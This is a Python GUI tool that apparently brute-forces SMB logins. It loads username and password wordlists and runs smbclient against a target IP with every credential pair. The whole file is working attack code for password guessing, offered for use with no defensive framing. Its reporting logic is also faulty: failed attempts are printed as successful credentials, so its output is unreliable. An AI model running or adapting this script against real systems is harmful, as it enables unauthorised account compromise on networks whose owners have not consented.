#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import PySimpleGUI as sg
import subprocess

sg.LOOK_AND_FEEL_TABLE['DarkMode'] = {  'BACKGROUND': '#121212',
                                    'TEXT': '#E0E0E0',
                                    'INPUT': '#1C1C1E',
                                    'TEXT_INPUT': '#FFFFFF',
                                    'SCROLL': '#32D74B',
                                    'BUTTON': ('#E0E0E0', '#32D74B'),
                                    'PROGRESS': ('#32D74B', '#333333'),
                                    'BORDER': 0,
                                    'SLIDER_DEPTH': 0,
                                    'PROGRESS_DEPTH': 0 }
sg.theme('DarkMode')
sg.SetOptions(element_padding=(8,8))

users = [] # A list of usernames
passw = [] # A list of passwords

err = 'NT_STATUS_LOGON_FAILURE'.encode()
suc = 'NT_STATUS_PASSWORD_MUST_CHANGE'.encode()

# readUserFile(filename) opens a file, appends each line as an element in the users list then closes the file
def readUserFile(filename):
    infile = open(filename, 'r')
    for name in infile:
        users.append(name.rstrip())
    infile.close()

# readPassFile(filename) does the same as readUserFile(), but appends to passw list
def readPassFile(filename):
    infile = open(filename, 'r')
    for password in infile:
        passw.append(password.rstrip())
    infile.close()

# brute(target) combines each username with every password and attempts to login via SMB to see if the credential pair works
def brute(target):
    i = 0
    for x in users:
        for y in passw:
                creds = x + "%" + y

                test = subprocess.Popen(['smbclient', '-L', target, '-U', creds], stdout=subprocess.PIPE)

                while True:
                    line = test.stdout.readline()
                    if not line: # If line doesn't exist, break
                        break
                    if (err in line): # If NT_STATUS_LOGON_FAILURE occurs, creds don't work so break
                        print('[-] {}'.format(creds))
                    if (suc in line): # If NT_STATUS_PASSWORD_MUST_CHANGE occurs, print that creds may work if updated
                        print('[+] {} - NOTE: Credentials must be changed'.format(creds))
                    else: # If no other checks find anything, print the credentals as they worked
                        print('[+] {}'.format(creds))
                i += 1
    print('Finished testing {} credentials'.format(i))

def MAKE_SMB_Enum():
    layout =   [    [sg.Text('Target IP:', font='Any 26', text_color='#E0E0E0'), sg.InputText('127.0.0.1', key='-TARGET-', font='Any 24', text_color='#E0E0E0')],
                    [sg.Text('Username list:', font='Any 26', text_color='#E0E0E0'), sg.InputText(key='-USERFILE-', font='Any 24', text_color='#E0E0E0'), sg.FileBrowse(font='Any 24')], 
                    [sg.Text('Password list:', font='Any 26', text_color='#E0E0E0'), sg.InputText(key='-PASSFILE-', font='Any 24', text_color='#E0E0E0'), sg.FileBrowse(font='Any 24')],  
                    [sg.Multiline(reroute_stdout=True, autoscroll=True, size=(1240, 8), text_color='#E0E0E0', font='Any 24')], 
                    [sg.Button('Start', font='Any 24'), sg.Button('Exit', font='Any 24', button_color=('#E0E0E0','#9F9FA5'))] ]

    return sg.Window('DDT - Enumeration : SMB', layout, size=(1280,720), finalize=True)

def CHECK_SMB_Enum(window, event, values):
    if event == sg.WIN_CLOSED or event == 'Exit':
        window.close()

    if event == 'Start':
        readUserFile(values['-USERFILE-'])
        readPassFile(values['-PASSFILE-'])
        brute(values['-TARGET-'])